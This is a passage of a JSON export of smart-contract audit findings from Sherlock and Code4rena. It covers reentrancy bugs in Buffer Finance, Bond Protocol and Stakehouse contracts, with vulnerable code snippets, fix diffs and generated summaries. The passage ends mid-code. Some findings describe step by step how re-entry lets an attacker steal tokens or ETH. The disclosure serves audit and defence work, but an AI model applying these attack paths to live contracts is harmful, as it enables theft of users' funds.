        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield Aggregator"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Options Vault"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "ERC777"
          }
        },
        {
          "tags_tag": {
            "title": "CEI"
          }
        }
      ]
    },
    {
      "id": "3627",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "MEDIUM",
      "finders_count": 3,
      "protocol_id": "100",
      "title": "M-1: resolveQueuedTrades() ERC777 re-enter to steal funds",
      "content": "Source: https://github.com/sherlock-audit/2022-11-buffer-judging/issues/130 \n\n## Found by \nbin2chen, HonorLt, KingNFT\n\n## Summary\n_openQueuedTrade() does not follow the “Checks Effects Interactions” principle and may lead to re-entry to steal the funds\n\nhttps://fravoll.github.io/solidity-patterns/checks_effects_interactions.html\n\n## Vulnerability Detail\nThe prerequisite is that tokenX is ERC777 e.g. “sushi”\n1. resolveQueuedTrades() call _openQueuedTrade()\n2. in _openQueuedTrade() call \"tokenX.transfer(queuedTrade.user)\" if (revisedFee < queuedTrade.totalFee) before set queuedTrade.isQueued = false; \n```solidity\n    function _openQueuedTrade(uint256 queueId, uint256 price) internal {\n...\n        if (revisedFee < queuedTrade.totalFee) {\n            tokenX.transfer( //***@audit call transfer , if ERC777 , can re-enter ***/\n                queuedTrade.user,\n                queuedTrade.totalFee - revisedFee\n            );\n        }\n\n        queuedTrade.isQueued = false;  //****@audit  change state****/\n    }\n```\n3.if ERC777 re-enter to #cancelQueuedTrade() to get tokenX back,it can close,  because queuedTrade.isQueued still equal true\n4. back to _openQueuedTrade()  set queuedTrade.isQueued = false\n5.so steal tokenX\n## Impact\nif tokenX equal ERC777 can steal token\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-11-buffer/blob/main/contracts/contracts/core/BufferRouter.sol#L350\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nfollow “Checks Effects Interactions” \n\n```solidity\n    function _openQueuedTrade(uint256 queueId, uint256 price) internal {\n...\n+      queuedTrade.isQueued = false; \n        // Transfer the fee to the target options contract\n        IERC20 tokenX = IERC20(optionsContract.tokenX());\n        tokenX.transfer(queuedTrade.targetContract, revisedFee);\n\n-       queuedTrade.isQueued = false; \n        emit OpenTrade(queuedTrade.user, queueId, optionId);\n    }\n```",
      "summary": "\nThis bug report concerns a vulnerability in the _openQueuedTrade() function of the BufferRouter.sol smart contract. It was found by bin2chen, HonorLt, and KingNFT and is related to the “Checks Effects Interactions” principle. If a tokenX is an ERC777 token, a malicious user could re-enter the cancelQueuedTrade() function to get the token back, as the queuedTrade.isQueued variable would still be true. This could result in the malicious user stealing tokenX.\n\nThe code snippet provided in the report shows the original code and the recommended code changes. The original code calls tokenX.transfer() before setting queuedTrade.isQueued to false. In the recommended code, queuedTrade.isQueued is set to false before the tokenX transfer.\n\nThe impact of this vulnerability is that if tokenX is an ERC777 token, a malicious user could steal it. The tool used to detect this vulnerability was manual review. The recommendation is to follow the “Checks Effects Interactions” principle when writing code.",
      "report_date": {},
      "contest_prize_txt": "21800 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/24",
      "sponsor_name": "Buffer Finance",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-buffer-judging/issues/130",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "24",
      "slug": "m-1-resolvequeuedtrades-erc777-re-enter-to-steal-funds-sherlock-buffer-finance-buffer-finance-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Buffer Finance",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Buffer Finance",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield Aggregator"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Options Vault"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "ERC777"
          }
        },
        {
          "tags_tag": {
            "title": "CEI"
          }
        }
      ]
    },
    {
      "id": "3759",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "MEDIUM",
      "finders_count": 1,
      "protocol_id": "102",
      "title": "M-3: Read-only reentrancy in BondFixedTermTeller",
      "content": "Source: https://github.com/sherlock-audit/2022-11-bond-judging/issues/23 \n\n## Found by \nZarf\n\n## Summary\n\nWhen minting new ERC1155 bonds in the `BondFixedTermTeller` contract, the total supply of this specific bond is updated after the new bonds are sent to the recipient, which introduces a reentrancy attack.\n\n## Vulnerability Detail\n\nWhenever a new ERC1155 bond is minted in the `BondFixedTermTeller` contract, either through `_handlePayout()` or `create()`, the total supply is updated after the bond has been minted. \n\nERC1155 tokens will perform a callback to the recipient in case the recipient implements the `ERC1155TokenReceiver` interface. Therefore, the recipient (`msg.sender` in `create()` or `recipient_` in `_handlePayout()` ) is able to perform a call to an arbitrary contract before the total supply of the bonds is updated.\n\nWhile the recipient could enter the current `BondFixedTermTeller` contract to call any function, there is no interesting function which might result in financial loss in case it gets called in the callback. Alternatively, the recipient could enter a smart contract which uses the the public mapping `tokenMetadata` in `BondFixedTermTeller` to calculate the current bond price based on the supply. As the supply is not yet updated, but the tokens are minted, this might result in a miscalculation of the price.\n\n## Impact\n\nWhile the `BondFixedTermTeller` contract itself is not at risk, any protocols integrating with `BondFixedTermTeller` and using the total supply of the ERC1155 bond token to calculate the price, might come at risk.\n\n## Code Snippet\n\n[https://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedTermTeller.sol#L218-L225](https://github.com/sherlock-audit/2022-11-bond/blob/main/src/BondFixedTermTeller.sol#L218-L225)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUpdate the total supply and mint the tokens afterwards:\n\n```solidity\nfunction _mintToken(\n    address to_,\n    uint256 tokenId_,\n    uint256 amount_\n) internal {\n    tokenMetadata[tokenId_].supply += amount_;\n    _mint(to_, tokenId_, amount_, bytes(\"\"));\n}\n```\n\n## Discussion\n\n**Evert0x**\n\nMessage from sponsor\n\n----\n\nAgree with this issue. We updated the `_mintToken()` and `_burnToken()` functions to update supply prior to minting/burning tokens to avoid the reentrancy issue.\n\n**xiaoming9090**\n\nFixed in https://github.com/Bond-Protocol/bonds/commit/fafd81d04d685d15612cc56af635513e11ddc626",
      "summary": "\nA bug was identified in the BondFixedTermTeller contract, which is part of the Bond Protocol, by a manual review conducted by Zarf. This bug allows a reentrancy attack when minting new ERC1155 bonds. Whenever a new bond is minted, the total supply is updated after the bond has been sent to the recipient and the recipient can perform a call to an arbitrary contract before the total supply is updated. This could lead to a miscalculation of the price as the supply is not yet updated but the tokens are minted. \n\nThe BondFixedTermTeller contract itself is not at risk, but any protocols integrating with it and using the total supply of the ERC1155 bond token to calculate the price, might come at risk. To fix this bug, the total supply and mint the tokens afterwards should be updated. The bug was fixed in the Bond Protocol with a commit to the GitHub repository.",
      "report_date": {},
      "contest_prize_txt": "33333 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/20",
      "sponsor_name": "Bond",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-bond-judging/issues/23",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "20",
      "slug": "m-3-read-only-reentrancy-in-bondfixedtermteller-sherlock-bond-bond-protocol-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Bond Protocol",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Bond Protocol",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Synthetics"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "RWA Lending"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "5907",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 4,
      "protocol_id": "106",
      "title": "[H-20] Possibly reentrancy attacks in _distributeETHRewardsToUserForToken function",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L73\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340\n\n\n## Vulnerability details\n\n### Author: rotcivegaf\n\n### Impact\n\nThe root of the problem are in the `_distributeETHRewardsToUserForToken` who makes a call to distribute the ether rewards. With this call the recipient can execute an reentrancy attack calling several times the different function to steal founds or take advantage of other users/protocol\n\n### Proof of Concept\n\nThis functions use the `_distributeETHRewardsToUserForToken`:\n\n#### [`beforeTokenTransfer`, **GiantMevAndFeesPool** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167):\n\nThe contract **GiantLP** use the **GiantMevAndFeesPool** contract as [`transferHookProcessor`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L14) and when use the functions [`_mint`, `_burn`, `transferFrom` and `transfer` of the ERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.7/contracts/token/ERC20/ERC20.sol), the function [`beforeTokenTransfer`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167) implemented in the **GiantMevAndFeesPool** bring a possibility to make a reentrancy attack because in the function [`_distributeETHRewardsToUserForToken`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L73) implemented in the [**GiantMevAndFeesPool** make a `call` to the `_recipient`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L67-L68)\n\nA contract can call the function `transfer` of **GiantLP** contract several time, transfer an `amount` from and to self, as the update of the [`claimed`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L203) would not be done until, it is executed the function [`_afterTokenTransfer`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantLP.sol#L43-L47) of the **GiantLP** contract, the [`due`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L61) amount calculated in `_distributeETHRewardsToUserForToken` of **SyndicateRewardsProcessor** contract and the `lastInteractedTimestamp` of **GiantLP** contract will be incorrect\n\n### [`withdrawLPTokens`, **GiantPoolBase** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90):\n\nThe possibility of the reentrancy is given when call function [`_onWithdraw`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L74), this function implemented in [**GiantMevAndFeesPool** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L181-L193) uses `_distributeETHRewardsToUserForToken` and this one call the recipient making the possibility of the reentrancy, breaking the code of [L76-L89](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L76-L89)\n\n### [`batchDepositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104):\n\nThe possibility of the reentrancy is given when call function [`_distributeETHRewardsToUserForToken`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88-L93), this function call the recipient making the possibility of the reentrancy, breaking the code of [L76-L89](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L96-L107)\n\n### [`depositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143):\n\nThe possibility of the reentrancy is given when call function [`_distributeETHRewardsToUserForToken`](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L128-L133), this function call the recipient making the possibility of the reentrancy, breaking the code of [L136-L142](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L136-L142)\n\n### [`beforeTokenTransfer`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340):\n\nThe possibility of the reentrancy is given when call function `_distributeETHRewardsToUserForToken` in [L333](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L333) and [L337](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L337), this function call the recipient making the possibility of the reentrancy, breaking the code of [L343-L351](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L343-L351)\n\n### Tools Used\n\nReview\n\n### Recommended Mitigation Steps\n\nOne possibility its wrap(`deposit`) ether in WETH and transfer as ERC20 token\n\nAnother, it's add `nonReentrant` guard to the functions:\n- [`beforeTokenTransfer`, **GiantMevAndFeesPool** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L146-L167)\n- [`withdrawLPTokens`, **GiantPoolBase** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L66-L90)\n- [`batchDepositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L66-L104)\n- [`depositETHForStaking`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L110-L143)\n- [`beforeTokenTransfer`, **StakingFundsVault** contract](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L314-L340)\n\n```diff\nFile: contracts/liquid-staking/GiantMevAndFeesPool.sol\n\n@@ -143,7 +143,7 @@ contract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, Syndicate\n     }\n\n     /// @notice Allow giant LP token to notify pool about transfers so the claimed amounts can be processed\n-    function beforeTokenTransfer(address _from, address _to, uint256) external {\n+    function beforeTokenTransfer(address _from, address _to, uint256) external nonReentrant {\n         require(msg.sender == address(lpTokenETH), \"Caller is not giant LP\");\n         updateAccumulatedETHPerLP();\n```\n\n```diff\nFile: contracts/liquid-staking/GiantPoolBase.sol\n\n@@ -66,7 +66,7 @@ contract GiantPoolBase is ReentrancyGuard {\n     /// @notice Allow a user to chose to withdraw vault LP tokens by burning their giant LP tokens. 1 Giant LP == 1 vault LP\n     /// @param _lpTokens List of LP tokens being owned and being withdrawn from the giant pool\n     /// @param _amounts List of amounts of giant LP being burnt in exchange for vault LP\n-    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external {\n+    function withdrawLPTokens(LPToken[] calldata _lpTokens, uint256[] calldata _amounts) external nonReentrant {\n         uint256 amountOfTokens = _lpTokens.length;\n         require(amountOfTokens > 0, \"Empty arrays\");\n         require(amountOfTokens == _amounts.length, \"Inconsistent array lengths\");\n```\n\n```diff\nFile: contracts/liquid-staking/StakingFundsVault.sol\n\n@@ -66,7 +66,7 @@ contract StakingFundsVault is\n     /// @notice Batch deposit ETH for staking against multiple BLS public keys\n     /// @param _blsPublicKeyOfKnots List of BLS public keys being staked\n     /// @param _amounts Amounts of ETH being staked for each BLS public key\n-    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable {\n+    function batchDepositETHForStaking(bytes[] calldata _blsPublicKeyOfKnots, uint256[] calldata _amounts) external payable nonReentrant {\n         uint256 numOfValidators = _blsPublicKeyOfKnots.length;\n         require(numOfValidators > 0, \"Empty arrays\");\n         require(numOfValidators == _amounts.length, \"Inconsistent array lengths\");\n\n@@ -110,7 +110,7 @@ contract StakingFundsVault is\n     /// @notice Deposit ETH against a BLS public key for staking\n     /// @param _blsPublicKeyOfKnot BLS public key of validator registered by a node runner\n     /// @param _amount Amount of ETH being staked\n-    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable returns (uint256) {\n+    function depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount) public payable nonReentrant returns (uint256) {\n         require(liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPublicKeyOfKnot) == false, \"BLS public key is banned or not a part of LSD network\");\n         require(\n             getAccountManager().blsPublicKeyToLifecycleStatus(_blsPublicKeyOfKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,\n\n@@ -312,7 +312,7 @@ contract StakingFundsVault is\n     }\n\n     /// @notice before an LP token is transferred, pay the user any unclaimed ETH rewards\n-    function beforeTokenTransfer(address _from, address _to, uint256) external override {\n+    function beforeTokenTransfer(address _from, address _to, uint256) external override nonReentrant {\n         address syndicate = liquidStakingNetworkManager.syndicate();\n         if (syndicate != address(0)) {\n             LPToken token = LPToken(msg.sender);\n```",
      "summary": "\nThis bug report is about a vulnerability found in the code of a contract called SyndicateRewardsProcessor. The root of the problem lies in the _distributeETHRewardsToUserForToken function, which makes a call to distribute the ether rewards. This call makes it possible for the recipient to execute a reentrancy attack, calling several times the different functions to steal funds or take advantage of other users/protocols.\n\nThis vulnerability is present in several functions, such as beforeTokenTransfer, withdrawLPTokens, batchDepositETHForStaking, depositETHForStaking and beforeTokenTransfer. In each case, the _distributeETHRewardsToUserForToken function is called, which calls the recipient and thus makes the reentrancy attack possible.\n\nThe recommended mitigation steps for this vulnerability include wrapping ether in WETH and transferring it as an ERC20 token, as well as adding a nonReentrant guard to the affected functions.",
      "report_date": {},
      "contest_prize_txt": "$90,500 USDC",
      "contest_link": "https://code4rena.com/contests/2022-11-lsd-network-stakehouse-contest",
      "sponsor_name": "Stakehouse Protocol",
      "sponsor_link": "https://twitter.com/blockswap_team",
      "quality_score": 5,
      "general_score": 4.666666666666667,
      "source_link": "https://code4rena.com/reports/2022-11-stakehouse",
      "github_link": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/328",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "182",
      "slug": "h-20-possibly-reentrancy-attacks-in-_distributeethrewardstouserfortoken-function-code4rena-stakehouse-protocol-lsd-network-stakehouse-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Stakehouse Protocol",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Stakehouse Protocol",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "5903",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "106",
      "title": "[H-16] Reentrancy vulnerability in GiantMevAndFeesPool.withdrawETH",
      "content": "\nGiantMevAndFeesPool.withdrawETH calls lpTokenETH.burn, then GiantMevAndFeesPool.beforeTokenTransfer, followed by a call to \\_distributeETHRewardsToUserForToken sends ETH to the user, which allows the user to call any function in the fallback. While GiantMevAndFeesPool.withdrawETH has the nonReentrant modifier, GiantMevAndFeesPool.claimRewards does not have the nonReentrant modifier.<br>\nWhen GiantMevAndFeesPool.claimRewards is called in GiantMevAndFeesPool.withdrawETH, the idleETH is reduced but the ETH is not yet sent to the user, which increases totalRewardsReceived and accumulatedETHPerLPShare, thus making the user receive more rewards when calling GiantMevAndFeesPool.claimRewards.\n\n### Proof of Concept\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L52-L64>\n\n### Recommended Mitigation Steps\n\nChange to\n\n```diff\nfunction withdrawETH(uint256 _amount) external nonReentrant {\n    require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");\n    require(lpTokenETH.balanceOf(msg.sender) >= _amount, \"Invalid balance\");\n    require(idleETH >= _amount, \"Come back later or withdraw less ETH\");\n\n-  idleETH -= _amount;\n\n    lpTokenETH.burn(msg.sender, _amount);\n+  idleETH -= _amount;\n\n    (bool success,) = msg.sender.call{value: _amount}(\"\");\n    require(success, \"Failed to transfer ETH\");\n\n    emit LPBurnedForETH(msg.sender, _amount);\n}\n```\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/244)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the GiantPoolBase.sol code. The vulnerability allows a user to call any function in the fallback when GiantMevAndFeesPool.withdrawETH is called. This is because when GiantMevAndFeesPool.withdrawETH is called, it calls lpTokenETH.burn followed by GiantMevAndFeesPool.beforeTokenTransfer and then a call to _distributeETHRewardsToUserForToken, which sends ETH to the user. The problem is that GiantMevAndFeesPool.claimRewards does not have the nonReentrant modifier while GiantMevAndFeesPool.withdrawETH does. This means that when GiantMevAndFeesPool.claimRewards is called in GiantMevAndFeesPool.withdrawETH, the idleETH is reduced but the ETH is not yet sent to the user, which increases totalRewardsReceived and accumulatedETHPerLPShare, thus making the user receive more rewards when calling GiantMevAndFeesPool.claimRewards.\n\nThe proof of concept is available at the given link, and no tools were used. The recommended mitigation step is to change the code as shown in the report. This should help prevent the vulnerability from being exploited.",
      "report_date": {},
      "contest_prize_txt": "$90,500 USDC",
      "contest_link": "https://code4rena.com/contests/2022-11-lsd-network-stakehouse-contest",
      "sponsor_name": "Stakehouse Protocol",
      "sponsor_link": "https://twitter.com/blockswap_team",
      "quality_score": 5,
      "general_score": 4,
      "source_link": "https://code4rena.com/reports/2022-11-stakehouse",
      "github_link": "https://github.com/code-423n4/2022-11-stakehouse-findings/issues/244",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "182",
      "slug": "h-16-reentrancy-vulnerability-in-giantmevandfeespoolwithdraweth-code4rena-stakehouse-protocol-lsd-network-stakehouse-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Stakehouse Protocol",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Stakehouse Protocol",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "5900",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "106",
      "title": "[H-13] Possible reentrancy and fund theft in withdrawDETH() of GiantSavETHVaultPool because there is no whitelist check for user provided Vaults and there is no reentrancy defense",
      "content": "## Lines of code\n\nhttps://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L62-L102\n\n\n## Vulnerability details\n\n## Impact\nFunction `withdrawDETH()` in `GiantSavETHVaultPool` allows a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults. This function make external calls to user provided addresses without checking those addresses and send increased dETH balance of contract during the call to user. user can provide malicious addresses to contract and then took the execution flow during the transaction and increase dETH balance of contract by other calls and make contract to transfer them to him.\n\n## Proof of Concept\nThis is `withdrawDETH()` in `GiantSavETHVaultPool`  code:\n```\n    /// @notice Allow a user to burn their giant LP in exchange for dETH that is ready to withdraw from a set of savETH vaults\n    /// @param _savETHVaults List of savETH vaults being interacted with\n    /// @param _lpTokens List of savETH vault LP being burnt from the giant pool in exchange for dETH\n    /// @param _amounts Amounts of giant LP the user owns which is burnt 1:1 with savETH vault LP and in turn that will give a share of dETH\n    function withdrawDETH(\n        address[] calldata _savETHVaults,\n        LPToken[][] calldata _lpTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfVaults = _savETHVaults.length;\n        require(numOfVaults > 0, \"Empty arrays\");\n        require(numOfVaults == _lpTokens.length, \"Inconsistent arrays\");\n        require(numOfVaults == _amounts.length, \"Inconsistent arrays\");\n\n        // Firstly capture current dETH balance and see how much has been deposited after the loop\n        uint256 dETHReceivedFromAllSavETHVaults = getDETH().balanceOf(address(this));\n        for (uint256 i; i < numOfVaults; ++i) {\n            SavETHVault vault = SavETHVault(_savETHVaults[i]);\n\n            // Simultaneously check the status of LP tokens held by the vault and the giant LP balance of the user\n            for (uint256 j; j < _lpTokens[i].length; ++j) {\n                LPToken token = _lpTokens[i][j];\n                uint256 amount = _amounts[i][j];\n\n                // Check the user has enough giant LP to burn and that the pool has enough savETH vault LP\n                _assertUserHasEnoughGiantLPToClaimVaultLP(token, amount);\n\n                require(vault.isDETHReadyForWithdrawal(address(token)), \"dETH is not ready for withdrawal\");\n\n                // Giant LP is burned 1:1 with LPs from sub-networks\n                require(lpTokenETH.balanceOf(msg.sender) >= amount, \"User does not own enough LP\");\n\n                // Burn giant LP from user before sending them dETH\n                